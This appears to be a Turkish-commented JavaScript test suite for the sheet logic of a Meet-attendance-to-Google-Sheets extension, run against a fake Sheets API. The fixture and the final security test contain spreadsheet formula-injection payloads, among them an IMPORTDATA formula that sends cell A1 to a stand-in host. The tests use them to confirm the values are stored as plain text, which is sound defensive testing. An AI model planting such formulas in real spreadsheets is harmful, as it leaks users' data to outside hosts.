'use strict';
/* Tablo mantığının uçtan uca testi: sahte Sheets API üzerinde oluşturma,
 * yoklama yazma, inceleme, özet. İsimler uydurmadır. */
const assert = require('assert');
const L = require('../extension/lib/sheetlogic.js');
const { FakeSpreadsheet } = require('./fake-sheets.js');

const MIN = 60000;
const T0 = Date.UTC(2026, 10, 7, 16, 0); // 7 Kasım 2026 19:00 İstanbul
const NOW = T0 + 2 * 3600 * 1000;

function run(fake, fn) {
  const wb = new L.Workbook(fake.model());
  L.ensureStructure(wb);
  const r = fn(wb);
  fake.batchUpdate(wb.toRequests());
  return r;
}

function sync(fake, session) {
  return run(fake, (wb) => {
    const rev = L.applyReview(wb, NOW);
    const r = L.processAttendance(wb, session, NOW);
    L.refreshSummary(wb, NOW);
    r.rev = rev;
    return r;
  });
}

function setup() {
  const fake = new FakeSpreadsheet(L.createBody('Belletmen Yoklama', 'Europe/Istanbul'));
  run(fake, (wb) => L.refreshSummary(wb, NOW));
  [
    ['', 'Aras Aksoy', 'yazılım', 'aktif', ''],
    ['', 'Şeyma Yıldız', 'mekanik', '', ''],
    ['', 'Mehmet Demir', 'elektrik', '', ''],
    ['', 'Mehmet Kaya', 'yazılım, medya', '', ''],
    ['', 'Zeynep Çelik', 'medya', '', ''],
    ['', 'Eski Üye', 'mekanik', 'pasif', '']
  ].forEach((r) => fake.userAppend('Üyeler', r));
  return fake;
}

function p(name, ...ivs) {
  return { name, joins: ivs.length, intervals: ivs.map(([a, b]) => [T0 + a * MIN, T0 + b * MIN]) };
}

function meeting1(id, offset) {
  const o = offset || 0;
  const s = {
    id: id || 'm1-abc', title: '07.11.2026 Haftalık toplantı', startedAt: T0, endedAt: T0 + 60 * MIN,
    participants: [
      p('Aras A.', [0, 60]),
      p('Seyma Yildiz', [15, 60]),
      p('Mehmet Demir', [0, 20]),
      p("Mehmet Demir'in iPhone'u", [10, 25]),
      p("Mehmet'in iPad'i", [2, 58]),
      p('Ahmet Yılmaz', [0, 60]),
      p('=HYPERLINK("http://x")', [0, 5])
    ]
  };
  if (o) {
    s.startedAt += o; s.endedAt += o;
    s.participants.forEach((x) => { x.intervals = x.intervals.map(([a, b]) => [a + o, b + o]); });
  }
  return s;
}

const byName = (rows, key, val) => rows.find((r) => r[key] === val);

// -----------------------------------------------------------------------------

test('tablo oluşturma: altı sayfa, başlıklar, ayarlar, gizli sütunlar', () => {
  const fake = new FakeSpreadsheet(L.createBody('X', 'Europe/Istanbul'));
  run(fake, () => {});
  assert.deepStrictEqual(fake.sheets.map((s) => s.title), ['Üyeler', 'Toplantılar', 'Yoklama', 'İnceleme', 'Özet', 'Ayarlar']);
  assert.deepStrictEqual(fake.sheet('Yoklama').cells[0], L.HEADERS.attendance);
  assert.strictEqual(fake.objects('Ayarlar').length, L.SETTINGS_DEF.length);
  assert.ok(fake.sheet('Yoklama').hiddenCols[12]);
  assert.deepStrictEqual(fake.sheet('Üyeler').validations[3], ['aktif', 'pasif']);
});

test('onarım: silinen sayfa ve eksik başlık geri gelir, var olan veri korunur', () => {
  const fake = setup();
  fake.sheets = fake.sheets.filter((s) => s.title !== 'İnceleme');
  fake.sheet('Ayarlar').cells.splice(2, 1); // bir ayar satırını sil
  run(fake, () => {});
  assert.ok(fake.sheet('İnceleme'));
  assert.strictEqual(fake.objects('Ayarlar').length, L.SETTINGS_DEF.length);
  assert.strictEqual(fake.objects('Üyeler').length, 6);
});

test('Üye ID\'leri otomatik doldurulur', () => {
  const fake = setup();
  run(fake, (wb) => L.readMembers(wb));
  assert.deepStrictEqual(fake.objects('Üyeler').map((o) => o['Üye ID']), ['U001', 'U002', 'U003', 'U004', 'U005', 'U006']);
});

test('saat dilimi: tarih seri sayıya ve geri doğru çevrilir', () => {
  const wb = new L.Workbook({ timeZone: 'Europe/Istanbul', sheets: [] });
  const serial = wb.toSerial(T0);
  // 7 Kasım 2026 19:00 İstanbul = 46333 + 19/24
  assert.ok(Math.abs(serial - (46333 + 19 / 24)) < 1e-9, String(serial));
  assert.strictEqual(wb.toMs(serial), T0);
});

test('yoklama: eşleştirme, iki cihazın birleşmesi, durumlar', () => {
  const fake = setup();
  const r = sync(fake, meeting1());
  assert.strictEqual(r.review, 3);
  assert.strictEqual(r.members, 3);

  const att = fake.objects('Yoklama');
  assert.strictEqual(att.length, 5, 'pasif ve gelmeyen pasif üye satır almaz');
  const st = (n) => byName(att, 'Ad Soyad', n);
  assert.strictEqual(st('Aras Aksoy')['Durum'], 'geldi');
  assert.strictEqual(st('Aras Aksoy')['Süre (dk)'], 60);
  assert.strictEqual(st('Şeyma Yıldız')['Durum'], 'geç');
  assert.strictEqual(st('Mehmet Demir')['Süre (dk)'], 25);
  assert.strictEqual(st('Mehmet Demir')['Durum'], 'kısmi');
  assert.strictEqual(st('Mehmet Demir')['Bağlanma'], 2);
  assert.strictEqual(st('Mehmet Kaya')['Durum'], 'gelmedi');
  assert.strictEqual(st('Zeynep Çelik')['Durum'], 'gelmedi');
  assert.ok(!st('Eski Üye'));

  const mt = fake.objects('Toplantılar');
  assert.strictEqual(mt.length, 1);
  assert.strictEqual(mt[0]['Süre (dk)'], 60);
  assert.strictEqual(Math.floor(mt[0]['Tarih']), 46333);

  const rev = fake.objects('İnceleme');
  assert.ok(/\[U00[34]\]$/.test(byName(rev, 'Meet adı', "Mehmet'in iPad'i")['Önerilen üye']));
  // formül gibi görünen ad düz metin (stringValue) olarak yazıldı
  assert.ok(byName(rev, 'Meet adı', '=HYPERLINK("http://x")'));
  assert.ok(fake.sheet('İnceleme').validations[6].includes('Mehmet Kaya [U004]'));
});

test('aynı yoklama tekrar gönderilirse çift kayıt olmaz', () => {
  const fake = setup();
  sync(fake, meeting1());
  const r = sync(fake, meeting1());
  assert.strictEqual(r.duplicate, true);
  assert.strictEqual(fake.objects('Yoklama').length, 5);
  assert.strictEqual(fake.objects('Toplantılar').length, 1);
});

test('hatalı istek varsa hiçbir şey yazılmaz (atomik)', () => {
  const fake = setup();
  const before = JSON.stringify(fake.sheets);
  assert.throws(() => run(fake, (wb) => {
    L.processAttendance(wb, meeting1(), NOW);
    wb.post.push({ bilinmeyenIstek: {} });
  }));
  assert.strictEqual(JSON.stringify(fake.sheets), before);
});

test('bozuk oturum verisi reddedilir', () => {
  const fake = setup();
  assert.throws(() => run(fake, (wb) => L.processAttendance(wb, { id: '../x', startedAt: 1, endedAt: 2, participants: [] }, NOW)), /kimliği/);
});

test('İncelemeyi uygula: yoklama güncellenir, takma ad eklenir, bir daha sorulmaz', () => {
  const fake = setup();
  sync(fake, meeting1());
  fake.userSet('İnceleme', (o) => o['Meet adı'] === "Mehmet'in iPad'i", 'Seçim', 'Mehmet Kaya [U004]');
  fake.userSet('İnceleme', (o) => o['Meet adı'] === 'Ahmet Yılmaz', 'Seçim', 'Misafir');
  const res = run(fake, (wb) => L.applyReview(wb, NOW));
  assert.strictEqual(res.applied, 2);
  assert.strictEqual(res.aliasesAdded, 1);
  assert.strictEqual(res.errors.length, 0, res.errors.join('; '));

  const kaya = byName(fake.objects('Yoklama'), 'Ad Soyad', 'Mehmet Kaya');
  assert.strictEqual(kaya['Durum'], 'geldi');
  assert.strictEqual(kaya['Süre (dk)'], 56);
  assert.strictEqual(byName(fake.objects('Üyeler'), 'Üye ID', 'U004')['Takma adlar'], "Mehmet'in iPad'i");
  assert.strictEqual(typeof byName(fake.objects('İnceleme'), 'Meet adı', 'Ahmet Yılmaz')['İşlendi'], 'number');

  // İkinci toplantı: takma ad öğrenildi
  const week = 7 * 24 * 60 * MIN;
  const r2 = sync(fake, { id: 'm2', title: 'İkinci', startedAt: T0 + week, endedAt: T0 + week + 60 * MIN,
    participants: [{ name: "Mehmet'in iPad'i", joins: 1, intervals: [[T0 + week, T0 + week + 60 * MIN]] }] });
  assert.strictEqual(r2.review, 0);
  const att2 = fake.objects('Yoklama').filter((o) => o['Toplantı ID'] === 'm2');
  assert.strictEqual(byName(att2, 'Ad Soyad', 'Mehmet Kaya')['Durum'], 'geldi');
});

test('bekleyen seçimler bir sonraki gönderimde otomatik uygulanır', () => {
  const fake = setup();
  sync(fake, meeting1('m1'));
  fake.userSet('İnceleme', (o) => o['Meet adı'] === "Mehmet'in iPad'i", 'Seçim', 'Mehmet Kaya [U004]');
  const r = sync(fake, meeting1('m2', 7 * 24 * 60 * MIN));
  assert.strictEqual(r.rev.applied, 1);
  // m2'de iPad artık takma adla kesin eşleşir, incelemeye düşmez
  assert.strictEqual(r.review, 2);
});

test('aynı adla bekleyen diğer satırlar da çözülür', () => {
  const fake = setup();
  sync(fake, meeting1('m1'));
  sync(fake, meeting1('m2', 7 * 24 * 60 * MIN));
  fake.userSet('İnceleme', (o) => o['Meet adı'] === 'Ahmet Yılmaz', 'Seçim', 'Misafir');
  const res = run(fake, (wb) => L.applyReview(wb, NOW));
  assert.strictEqual(res.applied, 2);
  assert.strictEqual(res.autoApplied, 1);
});

test('elle girilen "mazeretli" korunur', () => {
  const fake = setup();
  sync(fake, meeting1());
  fake.userSet('Yoklama', (o) => o['Ad Soyad'] === 'Mehmet Kaya', 'Durum', 'mazeretli');
  fake.userSet('İnceleme', (o) => o['Meet adı'] === "Mehmet'in iPad'i", 'Seçim', 'Mehmet Kaya [U004]');
  run(fake, (wb) => L.applyReview(wb, NOW));
  const kaya = byName(fake.objects('Yoklama'), 'Ad Soyad', 'Mehmet Kaya');
  assert.strictEqual(kaya['Durum'], 'mazeretli');
  assert.strictEqual(kaya['Süre (dk)'], 56);
});

test('geçersiz seçim hata olarak raporlanır, uygulanmaz', () => {
  const fake = setup();
  sync(fake, meeting1());
  fake.userSet('İnceleme', (o) => o['Meet adı'] === 'Ahmet Yılmaz', 'Seçim', 'Olmayan Kişi [U999]');
  const res = run(fake, (wb) => L.applyReview(wb, NOW));
  assert.strictEqual(res.applied, 0);
  assert.strictEqual(res.errors.length, 1);
});

test('Ayarlar sayfasındaki eşik kullanılır', () => {
  const fake = setup();
  fake.userSet('Ayarlar', (o) => o['Ayar'] === 'Minimum katılım (%)', 'Değer', 20);
  sync(fake, meeting1());
  assert.strictEqual(byName(fake.objects('Yoklama'), 'Ad Soyad', 'Mehmet Demir')['Durum'], 'geldi');
});

test('Özet sayfası: yüzde, üst üste kaçırma, alt takım tablosu', () => {
  const fake = setup();
  sync(fake, meeting1());
  const cells = fake.sheet('Özet').cells;
  assert.strictEqual(cells[1][0], 'Ad Soyad');
  const row = (n) => cells.find((r) => r && r[0] === n);
  assert.strictEqual(row('Zeynep Çelik')[9], 0);
  assert.strictEqual(row('Zeynep Çelik')[10], 1);
  assert.strictEqual(row('Aras Aksoy')[9], 1);
  assert.ok(row('Alt takım özeti'));
  assert.ok(row('yazılım'));
  assert.strictEqual(fake.sheet('Özet').formats['2,9'], 'PERCENT');
});

test('çok satırda ızgara otomatik büyür', () => {
  const fake = setup();
  for (let i = 0; i < 250; i++) fake.userAppend('Üyeler', ['', 'Üye ' + i, 'test', '', '']);
  for (let k = 0; k < 4; k++) sync(fake, meeting1('m' + k, k * 7 * 24 * 60 * MIN));
  assert.strictEqual(fake.objects('Yoklama').length, 4 * 255);
  assert.ok(fake.sheet('Yoklama').rowCount >= 4 * 255 + 1);
});

test('İnceleme sayaçları', () => {
  const fake = setup();
  sync(fake, meeting1());
  fake.userSet('İnceleme', (o) => o['Meet adı'] === 'Ahmet Yılmaz', 'Seçim', 'Misafir');
  const c = run(fake, (wb) => L.reviewCounts(wb));
  assert.deepStrictEqual(c, { open: 3, chosen: 1 });
});

test('güvenlik: Meet adındaki formül hiçbir yerde formül olarak yazılmaz', () => {
  const fake = setup();
  fake.userAppend('Üyeler', ['', '=IMPORTXML("http://x";"//a")', 'test', '', '']);
  const evil = '=IMPORTDATA("https://ornek.invalid/?"&A1)';
  sync(fake, { id: 'mx', title: '=HYPERLINK("x")', startedAt: T0, endedAt: T0 + 60 * MIN,
    participants: [p(evil, [0, 60])] });
  const all = fake.log.flat();
  const json = JSON.stringify(all);
  assert.ok(!json.includes('formulaValue'));
  // Doğrulama listesindeki "=" ile başlayan değer görünmez karakterle etkisizleştirildi
  const list = fake.sheet('İnceleme').validations[6];
  assert.ok(list.some((v) => v.startsWith('​=IMPORTXML')), JSON.stringify(list));
  assert.ok(!list.some((v) => /^[=+@-]/.test(v)));
  assert.strictEqual(fake.objects('Toplantılar')[0]['Ad'], '=HYPERLINK("x")');
});
